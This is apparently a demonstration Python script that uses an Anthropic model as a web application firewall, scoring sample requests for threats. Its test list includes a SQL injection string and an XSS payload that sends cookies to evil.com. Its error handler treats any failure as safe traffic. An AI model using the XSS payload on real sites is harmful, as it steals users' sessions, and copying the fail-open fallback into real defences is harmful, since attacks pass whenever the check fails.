import os
import json
from anthropic import Anthropic

# 1. Initialize the AI client using your environment variable
client = Anthropic(api_key=os.environ.get("ANTHROPIC_API_KEY"))

def evaluate_payload_with_ai(payload_text):
    """
    Sends a raw request or log payload to Claude to evaluate whether 
    it is malicious, suspicious, or safe.
    """
    
    system_instruction = (
        "You are an automated web application firewall and cybersecurity guardrail. "
        "Analyze the provided incoming request payload. "
        "You must respond ONLY with a valid JSON object containing two keys: "
        "'threat_score' (a float between 0.0 and 1.0) and "
        "'reason' (a brief explanation of why)."
    )

    try:
        # Call the Anthropic Messages API with explicit parameters
        response = client.messages.create(
            model="claude-sonnet-5-5", # Current active Sonnet model
            max_tokens=150,
            system=system_instruction,
            messages=[
                {"role": "user", "content": f"Analyze this payload: {payload_text}"}
            ]
        )
        
        # Extract the text returned by the model
        ai_response_text = response.content[0].text
        
        # Convert the string response into a Python dictionary
        result = json.loads(ai_response_text)
        return result

    except Exception as e:
        print(f"[ERROR] Failed to connect to AI engine: {e}")
        return {"threat_score": 0.0, "reason": "API error fallback - treated as safe."}

# --- SIMULATED INCOMING TRAFFIC ---
test_payloads = [
    "GET /index.html HTTP/1.1", # Normal traffic
    "SELECT * FROM users WHERE username = 'admin' --", # SQL Injection attempt
    "GET /images/logo.png HTTP/1.1", # Normal traffic
    "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>" # Cross-Site Scripting (XSS)
]

print("=== STARTING AI GUARDRAIL DEFENSE SYSTEM ==-\n")

# Loop through each incoming request and let the AI inspect it
for payload in test_payloads:
    print(f"[INSPECTING]: {payload}")
    
    # Run the AI evaluation
    evaluation = evaluate_payload_with_ai(payload)
    score = evaluation.get("threat_score", 0.0)
    reason = evaluation.get("reason", "No reason provided.")
    
    print(f" -> AI Threat Score: {score}")
    print(f" -> AI Reasoning: {reason}")
    
    # Active Containment Logic: If threat score is high, eliminate the threat
    if score >= 0.8:
        print(" -> 🛡️ ACTION: Threat threshold met! Blocking IP and dropping packet.\n")
    else:
        print(" -> ✅ ACTION: Payload safe. Allowing traffic through.\n")
